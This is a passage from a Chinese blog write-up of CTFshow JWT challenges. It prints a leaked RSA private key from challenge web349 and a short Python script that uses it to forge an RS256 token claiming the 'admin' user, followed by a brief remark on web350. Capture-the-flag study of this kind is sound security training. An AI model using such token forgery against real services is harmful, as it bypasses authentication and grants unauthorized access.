+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb<span class="operator">+</span>r6QPBryJmdaR1a3ToD9sXDb</span><br><span class="line">eni5WTsWVKrmzmCk7tu4iNtkmn<span class="symbol">/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8</span></span><br><span class="line">IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">AoGAE<span class="operator">+</span>mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2<span class="operator">+</span>OhYVEJq8VtPcVB1PK</span><br><span class="line">frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX</span><br><span class="line">h7iFjNscfs<span class="symbol">/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM</span></span><br><span class="line">cdEBOgkI<span class="symbol">/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi</span></span><br><span class="line">ST9LU4lxAkEA1lsfr9gF<span class="symbol">/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv</span></span><br><span class="line">ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA</span><br><span class="line"><span class="operator">+</span>tUDjQJAERSE<span class="symbol">/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ</span></span><br><span class="line">V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4<span class="operator">+</span>QgY<span class="operator">+</span>fYBt8DVFq5bHQUIvIW</span><br><span class="line">zawYVGZdwvuD9IgY<span class="symbol">/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV</span></span><br><span class="line">x<span class="operator">+</span>G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>有了私钥就能得到签名，然后就能任意构造了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sign_rs256.py</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb</span></span><br><span class="line"><span class="string">eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8</span></span><br><span class="line"><span class="string">IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB</span></span><br><span class="line"><span class="string">AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK</span></span><br><span class="line"><span class="string">frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX</span></span><br><span class="line"><span class="string">h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM</span></span><br><span class="line"><span class="string">cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi</span></span><br><span class="line"><span class="string">ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv</span></span><br><span class="line"><span class="string">ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA</span></span><br><span class="line"><span class="string">+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ</span></span><br><span class="line"><span class="string">V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW</span></span><br><span class="line"><span class="string">zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV</span></span><br><span class="line"><span class="string">x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1755622203</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, private_key, algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+<p>最后向主路由发送POST空请求即可：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250820110158.png" alt="20250820110158"></p>
+<h3 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h3><p>这道题目目前没理解为什么可以直接改算法从非对称加密改成对称加密。看以后遇到了再补充。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFshow%E2%80%94%E2%80%94jwt%E4%B8%93%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">CTFshow——jwt专题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2025-8-19"><span class="toc-number">1.2.</span> <span class="toc-text">2025.8.19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT"><span class="toc-number">1.2.1.</span> <span class="toc-text">JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E7%BB%84%E6%88%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">JWT组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web345-%E7%A9%BA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">web345(空加密算法)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web346-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.4.</span> <span class="toc-text">web346(弱密码加密)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web347-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%862"><span class="toc-number">1.2.5.</span> <span class="toc-text">web347(弱密码加密2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web348-%E5%BC%B1%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%863"><span class="toc-number">1.2.6.</span> <span class="toc-text">web348(弱密码加密3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web349-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95RS256%E5%85%AC%E9%92%A5%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.7.</span> <span class="toc-text">web349(非对称加密算法RS256公钥私钥泄露)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web350"><span class="toc-number">1.2.8.</span> <span class="toc-text">web350</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&text=CTFshow——jwt专题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&is_video=false&description=CTFshow——jwt专题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFshow——jwt专题&body=Check out this article: http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&title=CTFshow——jwt专题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&name=CTFshow——jwt专题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow_jwt%E4%B8%93%E9%A2%98/&t=CTFshow——jwt专题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    y@7q
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
